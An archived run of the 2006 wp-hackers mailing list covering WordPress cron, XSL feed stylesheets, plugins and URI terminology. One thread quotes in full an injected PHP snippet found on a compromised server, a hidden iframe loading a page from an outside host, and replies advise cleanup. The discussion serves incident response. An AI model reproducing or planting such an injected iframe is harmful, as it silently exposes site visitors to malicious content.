Peter Westwood <peter.westwood@ftwr.co.uk>
http://blog.ftwr.co.uk



From ringmaster at midnightcircus.com  Fri Apr  7 15:24:24 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Apr  7 15:24:44 2006
Subject: [wp-hackers] Cron?  Anyone?
In-Reply-To: <23126.199.64.72.252.1144420207.squirrel@epia.ftwr.co.uk>
References: <44367141.80602@midnightcircus.com>
	<23126.199.64.72.252.1144420207.squirrel@epia.ftwr.co.uk>
Message-ID: <44368428.7010000@midnightcircus.com>

Peter Westwood wrote:
> Scanning through my local phpxref'd copy of the trunk source it looks like
> wp-cron is called on the "init" hook if we are currently not already doing
> cron (see /wp-includes/default-filters.php lines 89-90).

Ah-HA!  That'll teach me for searching for /wp_cron\s*\(/ instead of 
/wp_cron(\b|\s*\()/

> Whether or not anything currently uses cron is another question.
> Looking around there does seem to be a number of references to
> wp_schedule_single_event - notably for pings and future posts.
> 
> I've just tried a future post on my test blog - now I wait to see if it
> turns up....

Hmm.  I think I'm 0 for 2 today on the regexes.  I checked my logs again 
and wp-cron.php is present several times over the past three days.  Who 
knows what I was doing before...  I must need a vacation.

In any case, future posting wasn't working for me a few weeks ago, 
perhaps before masquerade's cron updates.  Can you confirm that it does now?

Owen
-trying to reclaim some utility from this "the sky is falling" thread.

From peter.westwood at ftwr.co.uk  Fri Apr  7 16:08:55 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri Apr  7 16:12:30 2006
Subject: [wp-hackers] Cron?  Anyone?
In-Reply-To: <44368428.7010000@midnightcircus.com>
References: <44367141.80602@midnightcircus.com>	<23126.199.64.72.252.1144420207.squirrel@epia.ftwr.co.uk>
	<44368428.7010000@midnightcircus.com>
Message-ID: <44368E97.7020501@ftwr.co.uk>

Owen Winkler wrote:
> Peter Westwood wrote:
>> Scanning through my local phpxref'd copy of the trunk source it looks 
>> like
>> wp-cron is called on the "init" hook if we are currently not already 
>> doing
>> cron (see /wp-includes/default-filters.php lines 89-90).
>
> Ah-HA!  That'll teach me for searching for /wp_cron\s*\(/ instead of 
> /wp_cron(\b|\s*\()/
>
:-)
>> Whether or not anything currently uses cron is another question.
>> Looking around there does seem to be a number of references to
>> wp_schedule_single_event - notably for pings and future posts.
>>
>> I've just tried a future post on my test blog - now I wait to see if it
>> turns up....
>
> Hmm.  I think I'm 0 for 2 today on the regexes.  I checked my logs 
> again and wp-cron.php is present several times over the past three 
> days.  Who knows what I was doing before...  I must need a vacation.
>
> In any case, future posting wasn't working for me a few weeks ago, 
> perhaps before masquerade's cron updates.  Can you confirm that it 
> does now?
>
I have a number of these as well.

The future post i posted earlier failed and left the cron option empty 
now :-(

I have rescheduled it to see if it goes this time - I'll let you know!

westi
-- 
Peter Westwood <peter.westwood@ftwr.co.uk>

http://blog.ftwr.co.uk



From false.hopes at gmail.com  Fri Apr  7 19:26:32 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr  7 19:30:05 2006
Subject: [wp-hackers] Cron? Anyone?
In-Reply-To: <44368428.7010000@midnightcircus.com>
References: <44367141.80602@midnightcircus.com>
	<23126.199.64.72.252.1144420207.squirrel@epia.ftwr.co.uk>
	<44368428.7010000@midnightcircus.com>
Message-ID: <a491f91d0604071226w228c03c1m4a511a6cb39c0468@mail.gmail.com>

On 4/7/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> In any case, future posting wasn't working for me a few weeks ago,
> perhaps before masquerade's cron updates.  Can you confirm that it does now?

I can confirm that it does, although I wrote it, so I can't guarantee
it works on other setups. I've yet to try more than a 30 second test
on an apache2/mod_php setup, and I've done nothing with
apache2/mod_cgi or mod_fastcgi. Other environments untested include
anything on Windows, so if anyone can't get this to work, let me know
and I'll try to get a test environment on a given OS/setup to give it
a shot. I'll also be around on IRC in the -dev channel for a bit if
anyone wants to discuss this and we can squash bugs if there are any.

--
--Robert Deaton
http://somethingunpredictable.com
From r at robm.me.uk  Sat Apr  8 04:08:13 2006
From: r at robm.me.uk (Rob)
Date: Sat Apr  8 04:11:11 2006
Subject: [wp-hackers] XSL for feeds
Message-ID: <4437372D.8030000@robm.me.uk>

I know this discussion has been done before, but it never felt like 
there was a clear consensus or a culmination of the discussion. So, what 
do we think about adding XSL stylesheets for the feeds, a la the BBC [1]?

As far as I can tell, the arguments for boil down to:

# Improves usability considerably, especially with "greener" users; is 
much better than their being presented with a screen full of raw XML.
# Has very little overhead - even the complex BBC example's XSL 
stylesheet is a mere 6KB, which is insignificant even to dial-up users. 
WordPress's would be even leaner.
# Is aesthetically pleasing, if you're concerned with such things

What are/were the arguments against? It'd be nice to get this settled 
once and for all.

[1]: http://newsrss.bbc.co.uk/rss/newsonline_uk_edition/front_page/rss.xml

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From kaf at szub.net  Sat Apr  8 04:30:25 2006
From: kaf at szub.net (Kaf Oseo)
Date: Sat Apr  8 04:34:36 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <4437372D.8030000@robm.me.uk>
References: <4437372D.8030000@robm.me.uk>
Message-ID: <44373C61.6080009@szub.net>

Rob wrote:
> What are/were the arguments against?

If done, it will have to be provided in such a way users can (easily)
get to and modify it, such as a theme template.

Beyond that, I don't know if I'm particularly for it. The argument on
raw RSS being too confusing for 'newbies' is not very strong; once it's
explained why syndication feeds are not designed for *browsing*, they
tend to get it. But I can't see how a simple xsl with a few informative
Codex or other links would be terrible.

However, I don't plan on handling the support forum queries for how to
customize the stylesheet. :)

-Kaf

From r at robm.me.uk  Sat Apr  8 04:40:45 2006
From: r at robm.me.uk (Rob)
Date: Sat Apr  8 04:43:39 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <44373C61.6080009@szub.net>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
Message-ID: <44373ECD.5070408@robm.me.uk>

Kaf Oseo wrote:
> Rob wrote:
>> What are/were the arguments against?
>
> If done, it will have to be provided in such a way users can (easily)
> get to and modify it, such as a theme template.
>
> Beyond that, I don't know if I'm particularly for it. The argument on
> raw RSS being too confusing for 'newbies' is not very strong; once it's
> explained why syndication feeds are not designed for *browsing*, they
> tend to get it. But I can't see how a simple xsl with a few informative
> Codex or other links would be terrible.
>
> However, I don't plan on handling the support forum queries for how to
> customize the stylesheet. :)
>
> -Kaf
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
Could it not be done on the basis of "if theme's feed.xsl doesn't exist, 
fall back to default"? Seems fairly reasonable. We could even have some 
PHP in the XSL that displays a linkto the "Customising your XSL" Codex 
page if the user is logged in, avoiding 99% of support forum queries.

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From skeltoac at gmail.com  Sat Apr  8 04:45:34 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Sat Apr  8 04:49:10 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <44373C61.6080009@szub.net>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
Message-ID: <e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>

> Rob wrote:
> > What are/were the arguments against?

I don't know... maybe it's just not mainstream enough. I thought we
were a cutting-edge culture... are there no patches floating around?

I saw this today and it made me very happy not to see a bunch of code
show up. There can be no doubt that ours would be better, but this is
at least something I wouldn't mind my mom seeing:

http://ws.audioscrobbler.com/1.0/user/skeltoac/recenttracks.rss

We would need a function to generate the XSL URI, falling back on
default/classic if the theme didn't provide one. Then add one line to
each of our feed scripts. Not hard.

Every time someone clicks on a feed link, we alienate them a little
bit. This is a great opportunity to get exposure and make friends.

Now, what are the cons?

Andy
From philringnalda at gmail.com  Sat Apr  8 05:25:35 2006
From: philringnalda at gmail.com (Phil Ringnalda)
Date: Sat Apr  8 05:28:57 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <4437372D.8030000@robm.me.uk>
References: <4437372D.8030000@robm.me.uk>
Message-ID: <4437494F.5050902@gmail.com>

Rob wrote:
> What are/were the arguments against? It'd be nice to get this settled 
> once and for all.

As I remember it, my "argument against" was "don't spend too much time 
on it, because Firefox 2 and IE 7 are going to completely ignore your 
feed stylesheet and display feeds the way they want instead," which was 
seen as a horrible insult and an inability to understand upgrade lag and 
then pretty soon I lost interest in the thread.

Phil Ringnalda
From kaf at szub.net  Sat Apr  8 05:26:49 2006
From: kaf at szub.net (Kaf Oseo)
Date: Sat Apr  8 05:30:58 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <44373ECD.5070408@robm.me.uk>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
	<44373ECD.5070408@robm.me.uk>
Message-ID: <44374999.5020507@szub.net>

Rob wrote:
> Could it not be done on the basis of "if theme's feed.xsl doesn't exist, 
> fall back to default"? Seems fairly reasonable. We could even have some 
> PHP in the XSL that displays a linkto the "Customising your XSL" Codex 
> page if the user is logged in, avoiding 99% of support forum queries.

It's how the comments template is handled, so sure.

However, I seriously doubt your % on the topic of support queries. We
can provide the best links and documentation, and that will take care
of a fair number of help seekers, but nothing like 99%. But the issue
is not one of how to remove the need to support this. It's how best to
do it so supporting it is made easier. Pushing it into theme templates
I think will work for that, with a simple stylesheet (one that is well
commented!) provided along with the default theme, and no xsl handling
when a stylesheet is not located.

-Kaf
From kaf at szub.net  Sat Apr  8 05:27:34 2006
From: kaf at szub.net (Kaf Oseo)
Date: Sat Apr  8 05:31:39 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <4437494F.5050902@gmail.com>
References: <4437372D.8030000@robm.me.uk> <4437494F.5050902@gmail.com>
Message-ID: <443749C6.2040300@szub.net>

Phil Ringnalda wrote:
> As I remember it, my "argument against" was "don't spend too much time 
> on it, because Firefox 2 and IE 7 are going to completely ignore your 
> feed stylesheet and display feeds the way they want instead," which was 
> seen as a horrible insult and an inability to understand upgrade lag and 
> then pretty soon I lost interest in the thread.


Sure, go ahead and ignore Opera. ;)

-Kaf
From podz at tamba2.org.uk  Sat Apr  8 07:16:57 2006
From: podz at tamba2.org.uk (Podz)
Date: Sat Apr  8 07:20:37 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
	<e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>
Message-ID: <44376369.5040606@tamba2.org.uk>

Andy Skelton wrote:
> 
> Now, what are the cons?
> 

Right now, support.
We are asking theme authors to learn new code. I have no doubt some will 
but I would guess most will not. Which leaves support to fall elsewhere. 
That generates problems.....

Also, doesn't this work against RSS as a technology? If feeds are made 
'pretty' then won't some people fail to see it for what it is? To take 
the audiscrobbler feed as an example, a support question will be "How 
can I get my blog header there instead".

That said, I know little about rss/atom etc.

I'm actually in favour of a default, but I'm not in favour of supporting 
forum questions right now. Point me at an 'xslt for beginners' and I'll 
go play :)

P.
From dmhouse at gmail.com  Sat Apr  8 09:39:07 2006
From: dmhouse at gmail.com (David House)
Date: Sat Apr  8 09:42:44 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <44376369.5040606@tamba2.org.uk>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
	<e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>
	<44376369.5040606@tamba2.org.uk>
Message-ID: <ebe43d680604080239u3863782aw964e805622de94c2@mail.gmail.com>

On 08/04/06, Podz <podz@tamba2.org.uk> wrote:
> Right now, support.
> We are asking theme authors to learn new code. I have no doubt some will
> but I would guess most will not. Which leaves support to fall elsewhere.
> That generates problems.....

Then lets have a WordPress-branded default instead of a
Kubrick-branded default. Then theme authors can feel happy about not
providing an XSL, because the default will fit in with any theme.

http://trac.wordpress.org/ticket/1380 is the bug for this, by the way.
I unassigned it so someone that want to code this can feel free to
accept it. Depending on how long it'll take to throw together, I may
find time over the next couple of weeks to code it.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From dmhouse at gmail.com  Sat Apr  8 12:17:32 2006
From: dmhouse at gmail.com (David House)
Date: Sat Apr  8 12:21:09 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <44376369.5040606@tamba2.org.uk>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
	<e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>
	<44376369.5040606@tamba2.org.uk>
Message-ID: <ebe43d680604080517p5965050v60fe896cf54b6f3f@mail.gmail.com>

On 08/04/06, Podz <podz@tamba2.org.uk> wrote:
> Right now, support.
> We are asking theme authors to learn new code. I have no doubt some will
> but I would guess most will not. Which leaves support to fall elsewhere.
> That generates problems.....

Actually, I just had a better idea. XSLT can basically spit out
anything you want, so in our case we'd get it to spit out HTML. It
doesn't specify colours and fonts etc., that's what CSS is for. So we
have three layers:

RSS
Transformed by our XSLT sylesheet to HTML
Style by CSS

We can allow theme authors to change the CSS layer. We could also
allow them to change the middle layer as well, but in most cases this
wouldn't be necessary. This way, they don't have to know any XSLT.

As for an XSLT tutorial, http://www.w3schools.com/xsl/default.asp

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From r at robm.me.uk  Sat Apr  8 14:14:28 2006
From: r at robm.me.uk (Rob)
Date: Sat Apr  8 14:17:11 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <ebe43d680604080517p5965050v60fe896cf54b6f3f@mail.gmail.com>
References: <4437372D.8030000@robm.me.uk>
	<44373C61.6080009@szub.net>	<e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>	<44376369.5040606@tamba2.org.uk>
	<ebe43d680604080517p5965050v60fe896cf54b6f3f@mail.gmail.com>
Message-ID: <4437C544.4030900@robm.me.uk>

David House wrote:
> On 08/04/06, Podz <podz@tamba2.org.uk> wrote:
>   
>> Right now, support.
>> We are asking theme authors to learn new code. I have no doubt some will
>> but I would guess most will not. Which leaves support to fall elsewhere.
>> That generates problems.....
>>     
>
> Actually, I just had a better idea. XSLT can basically spit out
> anything you want, so in our case we'd get it to spit out HTML. It
> doesn't specify colours and fonts etc., that's what CSS is for. So we
> have three layers:
>
> RSS
> Transformed by our XSLT sylesheet to HTML
> Style by CSS
>
> We can allow theme authors to change the CSS layer. We could also
> allow them to change the middle layer as well, but in most cases this
> wouldn't be necessary. This way, they don't have to know any XSLT.
>
> As for an XSLT tutorial, http://www.w3schools.com/xsl/default.asp
>
> --
> -David House, dmhouse@gmail.com, http://xmouse.ithium.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>   
That sounds cracking, especially since theme authors will likely only 
want to change the appearance of the message rather than the message 
itself, which will likely be something generic :)

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From ringmaster at midnightcircus.com  Sat Apr  8 14:38:11 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Sat Apr  8 14:42:03 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <ebe43d680604080517p5965050v60fe896cf54b6f3f@mail.gmail.com>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
	<e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>
	<44376369.5040606@tamba2.org.uk>
	<ebe43d680604080517p5965050v60fe896cf54b6f3f@mail.gmail.com>
Message-ID: <4437CAD3.3050107@midnightcircus.com>

David House wrote:
> On 08/04/06, Podz <podz@tamba2.org.uk> wrote:
>> Right now, support.
>> We are asking theme authors to learn new code. I have no doubt some will
>> but I would guess most will not. Which leaves support to fall elsewhere.
>> That generates problems.....
> 
> Actually, I just had a better idea. XSLT can basically spit out
> anything you want, so in our case we'd get it to spit out HTML. It
> doesn't specify colours and fonts etc., that's what CSS is for. So we
> have three layers:

Do not give theme authors the ability to customize yet another 
presentation method for their blog.  There is a very simple solution for 
this.  The solution is two-fold:

1) Insert a hook to drop XSL into the feed so that overzealous feed 
customizers can style things themselves if they really must.

2) Set that hook to display a default XSL stylesheet that *creates a 
two-frame frameset* (or better, an iframe with a header).  The top 
frame/header has a notice that says "You are viewing a feed URL.  Add 
<a>the feed</a> to your <a>aggregator</a> to read this site from there." 
  The bottom frame contains the *blog home page itself*.

That way, you get the notice that you should be using that URL with an 
aggregator along with a link to what an aggregator is and where to get 
one.  You also don't have to worry about your blog appearing in a new 
format, because you're already using the format that your theme provides.

Owen
From jason at zenenet.com  Sat Apr  8 15:17:53 2006
From: jason at zenenet.com (Jason Salaz)
Date: Sat Apr  8 15:21:33 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <4437CAD3.3050107@midnightcircus.com>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
	<e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>
	<44376369.5040606@tamba2.org.uk>
	<ebe43d680604080517p5965050v60fe896cf54b6f3f@mail.gmail.com>
	<4437CAD3.3050107@midnightcircus.com>
Message-ID: <9017d890604080817ld4a5694g656d40b9f7184b5f@mail.gmail.com>

On 4/8/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> 1) Insert a hook to drop XSL into the feed so that overzealous feed
> customizers can style things themselves if they really must.

http://trac.wordpress.org/ticket/2357
From oliver at webride.org  Mon Apr 10 19:29:46 2006
From: oliver at webride.org (Oliver Specht)
Date: Mon Apr 10 19:33:43 2006
Subject: [wp-hackers] Comment Plugin
Message-ID: <443AB22A.60506@webride.org>

Hi,
I'd like to write a plugin for the comment function of wordpress. My
problem is, that I need the nickname/username of the poster of a
comment. The specialty is, that the user is not logged in so I need the
POST data from the comment form.

How do I get it? I used the get_comment_author() function but it only
returns "Anonymous"...

Thx!

Oliver
-- 
Oliver Specht
Open Metanet - Discuss Web Pages

http://www.webride.org/
mailto:oliver@webride.org
From if.website at gmail.com  Mon Apr 10 20:21:51 2006
From: if.website at gmail.com (Austin Matzko)
Date: Mon Apr 10 20:25:38 2006
Subject: [wp-hackers] Comment Plugin
In-Reply-To: <443AB22A.60506@webride.org>
References: <443AB22A.60506@webride.org>
Message-ID: <674b4a3b0604101321v1e6b4849wb4817f20078f195@mail.gmail.com>

On 4/10/06, Oliver Specht <oliver@webride.org> wrote:
> Hi,
> I'd like to write a plugin for the comment function of wordpress. My
> problem is, that I need the nickname/username of the poster of a
> comment. The specialty is, that the user is not logged in so I need the
> POST data from the comment form.
>
> How do I get it? I used the get_comment_author() function but it only
> returns "Anonymous"...

If you're trying to get comment data right after it's been posted, why
don't you do something like this:

1. Hook a function into the "comment_post" action, which occurs once a
comment has been entered into the database and passes the comment's id
to the function.
2. Use get_commentdata([the comment's id]) to get the author info
about that comment.

function get_the_comment_author($id) {
$data = get_commentdata($id);
$author = $data['comment_author'];
...
}

add_action('comment_post', 'get_the_comment_author');
From denis at semiologic.com  Mon Apr 10 22:39:40 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Mon Apr 10 22:44:54 2006
Subject: [wp-hackers] hack in the loose, or old stuff?
Message-ID: <000e01c65cef$a8de2df0$8e01a8c0@kergan>

Has anyone come accross something along these lines before?


<?php 
/* Short and sweet */
define('WP_USE_THEMES', true);
require('./wp-blog-header.php');
?> <iframe src="http://196.regvista.com/index.php?ref=r22" width=1 height=1
marginheight=0 marginwidth=0 scrolling=auto border="0" noresize
style='display:none;'></iframe>


Denis

From skeltoac at gmail.com  Mon Apr 10 22:54:11 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon Apr 10 22:57:55 2006
Subject: [wp-hackers] hack in the loose, or old stuff?
In-Reply-To: <000e01c65cef$a8de2df0$8e01a8c0@kergan>
References: <000e01c65cef$a8de2df0$8e01a8c0@kergan>
Message-ID: <e6ec604d0604101554l6877c558g289e39c47319f330@mail.gmail.com>

On 4/10/06, Denis de Bernardy <denis@semiologic.com> wrote:
> Has anyone come accross something along these lines before?
>

No, and it looks bad.
From leftjustified at gmail.com  Mon Apr 10 23:12:45 2006
From: leftjustified at gmail.com (Andrew Krespanis)
Date: Mon Apr 10 23:16:27 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <ebe43d680604080517p5965050v60fe896cf54b6f3f@mail.gmail.com>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
	<e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>
	<44376369.5040606@tamba2.org.uk>
	<ebe43d680604080517p5965050v60fe896cf54b6f3f@mail.gmail.com>
Message-ID: <6453a6e90604101612q7334e78byfdc1530e1cb5aa10@mail.gmail.com>

I must be missing something here... does IE not support styling of XML with CSS?

If it does, why don't we just use CSS to style the RSS feed; thereby
killing off the need for newbies to learn another language? I don't
know about you guys, but I found learning XSL a hell of a lot more
daunting than learning CSS.
It's not like people are going to need to do anything real crazy (eg:
CSS tables via display:table; etc) with their RSS feeds, so surely CSS
would suffice?

-Andrew.

On 4/8/06, David House <dmhouse@gmail.com> wrote:
> On 08/04/06, Podz <podz@tamba2.org.uk> wrote:
> > Right now, support.
> > We are asking theme authors to learn new code. I have no doubt some will
> > but I would guess most will not. Which leaves support to fall elsewhere.
> > That generates problems.....
>
> Actually, I just had a better idea. XSLT can basically spit out
> anything you want, so in our case we'd get it to spit out HTML. It
> doesn't specify colours and fonts etc., that's what CSS is for. So we
> have three layers:
>
> RSS
> Transformed by our XSLT sylesheet to HTML
> Style by CSS
From kaf at szub.net  Mon Apr 10 23:15:36 2006
From: kaf at szub.net (Kaf Oseo)
Date: Mon Apr 10 23:19:18 2006
Subject: [wp-hackers] hack in the loose, or old stuff?
In-Reply-To: <000e01c65cef$a8de2df0$8e01a8c0@kergan>
References: <000e01c65cef$a8de2df0$8e01a8c0@kergan>
Message-ID: <443AE718.2000704@szub.net>

http://www.symantec.com/avcenter/venc/data/bloodhound.exploit.56.html

See the technical details for sites which *may* contain the files
for the exploit.

-Kaf
From false.hopes at gmail.com  Mon Apr 10 23:17:52 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Apr 10 23:21:33 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <6453a6e90604101612q7334e78byfdc1530e1cb5aa10@mail.gmail.com>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
	<e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>
	<44376369.5040606@tamba2.org.uk>
	<ebe43d680604080517p5965050v60fe896cf54b6f3f@mail.gmail.com>
	<6453a6e90604101612q7334e78byfdc1530e1cb5aa10@mail.gmail.com>
Message-ID: <a491f91d0604101617x62a749fbhcd8f208f861e6ae0@mail.gmail.com>

On 4/10/06, Andrew Krespanis <leftjustified@gmail.com> wrote:
> I must be missing something here... does IE not support styling of XML with CSS?

I'm not sure

> If it does, why don't we just use CSS to style the RSS feed; thereby
> killing off the need for newbies to learn another language? I don't
> know about you guys, but I found learning XSL a hell of a lot more
> daunting than learning CSS.

There are reasons for XSL over CSS, namely the need for
transformations of some sort. http://www.w3.org/Style/CSS-vs-XSL

> It's not like people are going to need to do anything real crazy (eg:
> CSS tables via display:table; etc) with their RSS feeds, so surely CSS
> would suffice?

IE doesn't support display: table; anyways

--
--Robert Deaton
http://somethingunpredictable.com
From john at integralsource.com  Mon Apr 10 23:33:22 2006
From: john at integralsource.com (John Keyes)
Date: Mon Apr 10 23:37:03 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <6453a6e90604101612q7334e78byfdc1530e1cb5aa10@mail.gmail.com>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
	<e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>
	<44376369.5040606@tamba2.org.uk>
	<ebe43d680604080517p5965050v60fe896cf54b6f3f@mail.gmail.com>
	<6453a6e90604101612q7334e78byfdc1530e1cb5aa10@mail.gmail.com>
Message-ID: <c0141a030604101633s6796e888t784d2a6ff85a00fe@mail.gmail.com>

On 4/11/06, Andrew Krespanis <leftjustified@gmail.com> wrote:
> I must be missing something here... does IE not support styling of XML with CSS?
Safari 1.3 and Firefox 1.5.0.1 support it.

> If it does, why don't we just use CSS to style the RSS feed; thereby
> killing off the need for newbies to learn another language? I don't
> know about you guys, but I found learning XSL a hell of a lot more
> daunting than learning CSS.
> It's not like people are going to need to do anything real crazy (eg:
> CSS tables via display:table; etc) with their RSS feeds, so surely CSS
> would suffice?

There are a number of resources out there available for this already:
http://www.petefreitag.com/item/208.cfm
http://interglacial.com/~sburke/stuff/pretty_rss.html

(in fact just look at these search results http://tinyurl.com/jgps4).

I've done lots of work with XSLT so I'll be able to help out with that
approach if someone needs it.  I don't have much time available but
if you want to bash questions of me, feel free.

-John K
From denis at semiologic.com  Mon Apr 10 23:54:24 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Mon Apr 10 23:58:40 2006
Subject: [wp-hackers] hack in the loose, or old stuff?
In-Reply-To: <443AE718.2000704@szub.net>
Message-ID: <003601c65cfa$19b06d90$8e01a8c0@kergan>

yeah, that would probably be the src file of the iframe. a grep on the
server revealed that pretty much every php file had been modified, hence my
posting the question over here.

Oh well...
D.


> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of Kaf Oseo
> Sent: Monday, April 10, 2006 4:16 PM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] hack in the loose, or old stuff?
> 
> 
> http://www.symantec.com/avcenter/venc/data/bloodhound.exploit.56.html
> 
> See the technical details for sites which *may* contain the 
> files for the exploit.
> 
> -Kaf
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com 
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 

From false.hopes at gmail.com  Tue Apr 11 00:16:49 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Tue Apr 11 00:20:32 2006
Subject: [wp-hackers] hack in the loose, or old stuff?
In-Reply-To: <003601c65cfa$19b06d90$8e01a8c0@kergan>
References: <443AE718.2000704@szub.net> <003601c65cfa$19b06d90$8e01a8c0@kergan>
Message-ID: <a491f91d0604101716l331ce845me1f5d7e08a3267c6@mail.gmail.com>

On 4/10/06, Denis de Bernardy <denis@semiologic.com> wrote:
> yeah, that would probably be the src file of the iframe. a grep on the
> server revealed that pretty much every php file had been modified, hence my
> posting the question over here.
>

Now might be a _great_ time to start changing passwords, cleaning
files, scanning for rootkits, fixing file permissions, etc.

--
--Robert Deaton
http://somethingunpredictable.com
From bmygal at gmail.com  Wed Apr 12 00:31:43 2006
From: bmygal at gmail.com (Brian)
Date: Wed Apr 12 00:35:26 2006
Subject: [wp-hackers] geocomments?
Message-ID: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>

I'm interested in adding geocomments to my WP site, but I can't find any
working plugins.

Geocomments are WP user comments with lat/long (or address) fields, then
plots comment on an embedded googlemap.

Here's an old non-functioning geocomment plugin:
http://bravo5.org/blog/software-projects/geocomments/

Anyone familiar with WP geocomments out there?
From nuclearmoose at gmail.com  Wed Apr 12 03:40:26 2006
From: nuclearmoose at gmail.com (Craig)
Date: Wed Apr 12 03:44:09 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
Message-ID: <5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>

Seen Geo? http://www.redalt.com/downloads/

Craig.
From Brian at TheCodeCave.com  Wed Apr 12 03:59:29 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed Apr 12 04:03:03 2006
Subject: [wp-hackers] The use of new technical words just because they are
	there.
In-Reply-To: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
Message-ID: <!~!AAAAADHjbOXNGMFEpRyNlZYQJedE2jIA@TheCodeCave.com>

I was forwarded here from the support forum. I appologize if this is not the
correct forum, so to speak, for this inquiry.

First, I know this is a topic that comes up periodically, but the last time
I found it specifically addressed on the Wordpress Forum was 2004 and no one
directly addressed it even then. So please bear with me if you think you've
heard it all before, for I'm going to try to be to the point and get to the
bottom of the choice of URI over URL, as I haven't seen any posts do that
yet.

Second, Yes, I do know the difference between the a URI and a URL and did
the obligatory URL vs URI blog entry to prove it. The link is here
http://www.TheCodeCave.com/?p=93, but if you know the difference between a
url and URI you don't need to visit. This isn't a "get visitors" stunt, but
I knew people might try to explain the details to me, and I wanted to
outline my thoughts on the subject and definitions before a Q&A session was
started.

Now, to the meat of it all...
I am speaking against the use of URI specifically in the Options form, but
also in the documentation.  WordPress is asking for a URI when it will not
accept all valid URI. Therefore it is asking for the wrong thing. 

The simple fact that WordPress it specifies *address* in the prompts for the
"WordPress address (URI):" and "Blog address (URI):" is a clue that it only
wants an URL. 

Beyond that blogs now can have URNs.  My blog, like many others, has an ASIN
from Alexa. Therefore, a valid formated URI for my blog would be:
ASIN:B000F1J35C. That fits the URN specification and it for now an for ever
more will uniquely identify my site even after my site has long disappeared
from the web. However, can I enter that into the URI field in Wordpress? No,
of course not.  You CANNOT enter a URN into those fields, because Wordpress
does not want any old URI. Wordpress specificially wants an URL.

My main point here, and on my site, is that it is foolish to use a fancy
term that new users don't know just so that your software looks technical
and geeky. This is the sort of slippery slope that you have with open source
projects. Bad habits are promoted when smaller projects use a bad term or
code segment that is picked up in larger projects.  

WordPress should do the right thing and change the term back from URI to
URL.

I see four primary reasons to do this:
* URL is the language used in most professional projects.
* The term URI is not known to the general computing public. 
* URL is more accurate in all WordPress use cases. 
* Some valid URIs would produce errors if entered into the URI field. 

